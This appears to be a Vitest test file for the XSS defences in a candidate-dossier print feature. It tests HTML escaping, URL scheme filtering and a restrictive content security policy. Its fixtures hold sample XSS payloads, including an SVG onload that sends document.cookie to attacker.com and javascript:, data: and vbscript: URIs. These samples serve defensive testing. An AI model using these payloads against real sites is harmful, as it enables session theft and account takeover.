import { describe, it, expect } from 'vitest';
import { escapeHtml, sanitizeUrl, PRINT_CSP_META } from '../../utils/printSanitizer';

describe('P0 Security Requirement B: Stored XSS Defense in Candidate Dossier Printing', () => {
  describe('escapeHtml contextual sanitization', () => {
    it('escapes basic script injection tags into harmless HTML entities', () => {
      const maliciousPayload = '<script>fetch("/api/admin/system-members").then(r=>r.json())</script>';
      const result = escapeHtml(maliciousPayload);

      expect(result).not.toContain('<script>');
      expect(result).not.toContain('</script>');
      expect(result).toBe('&lt;script&gt;fetch(&quot;/api/admin/system-members&quot;).then(r=&gt;r.json())&lt;/script&gt;');
    });

    it('escapes image onerror event handler payloads in candidate answers into inert text', () => {
      const payload = '<img src="invalid-image.jpg" onerror="alert(document.domain)" />';
      const result = escapeHtml(payload);

      expect(result).not.toContain('<img');
      expect(result).toContain('&lt;img');
      expect(result).toBe('&lt;img src=&quot;invalid-image.jpg&quot; onerror=&quot;alert(document.domain)&quot; /&gt;');
    });

    it('escapes SVG onload payloads in candidate notes or skills into inert text', () => {
      const payload = '<svg onload="window.location=\'http://attacker.com?c=\'+document.cookie">';
      const result = escapeHtml(payload);

      expect(result).not.toContain('<svg');
      expect(result).toContain('&lt;svg');
    });

    it('escapes double quotes and single quotes to prevent attribute breakout', () => {
      const payload = '" onfocus="alert(1)" autofocus="';
      const result = escapeHtml(payload);

      expect(result).not.toContain('"');
      expect(result).toBe('&quot; onfocus=&quot;alert(1)&quot; autofocus=&quot;');
    });

    it('handles null, undefined, and non-string inputs safely without throwing', () => {
      expect(escapeHtml(null)).toBe('');
      expect(escapeHtml(undefined)).toBe('');
      expect(escapeHtml(12345)).toBe('12345');
      expect(escapeHtml(0)).toBe('0');
      expect(escapeHtml(false)).toBe('false');
    });
  });

  describe('sanitizeUrl defense', () => {
    it('neutralizes javascript: URI schemes', () => {
      const malicious = 'javascript:alert(document.cookie)';
      expect(sanitizeUrl(malicious)).toBe('#');
    });

    it('neutralizes data: text/html base64 XSS URIs', () => {
      const malicious = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==';
      expect(sanitizeUrl(malicious)).toBe('#');
    });

    it('neutralizes vbscript: URI schemes', () => {
      const malicious = 'vbscript:msgbox("XSS")';
      expect(sanitizeUrl(malicious)).toBe('#');
    });

    it('permits legitimate https:// and http:// links', () => {
      expect(sanitizeUrl('https://linkedin.com/in/safe-candidate')).toBe('https://linkedin.com/in/safe-candidate');
      expect(sanitizeUrl('http://github.com/developer')).toBe('http://github.com/developer');
    });
  });

  describe('PRINT_CSP_META defense-in-depth', () => {
    it('strictly forbids script execution in print windows via default-src none', () => {
      expect(PRINT_CSP_META).toContain("default-src 'none'");
      expect(PRINT_CSP_META).toContain("style-src 'unsafe-inline'");
      expect(PRINT_CSP_META).not.toContain("'unsafe-inline' 'unsafe-eval'");
    });
  });
});
